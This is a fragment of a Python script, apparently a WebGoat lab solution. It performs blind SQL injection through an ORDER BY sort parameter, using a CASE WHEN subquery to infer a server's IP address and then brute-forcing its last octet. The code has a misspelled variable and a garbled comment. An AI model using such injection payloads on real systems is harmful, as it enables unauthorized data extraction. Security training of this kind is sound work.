...
JSESSIONID = 'BEBFC1B7D47DDA7998FA1AA86ECA12EA' #FIXME
...
def test():
    ...
    #sortBy = 'hostname'
    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.4' then \
        id else hostname end)" # this is true; so sort by id; also we confirmed that servers table exists
    if getRequest(sortyBy, True):
        print('Success!')
    else:
        print('Keep trying!')
...
def bruteForce():
    ...
    for i in range(1, 255): # check for values between 1 and 254.130.219.202
        ...
        if getRequest(sortyBy.format(ip), False):
            print('Success!')
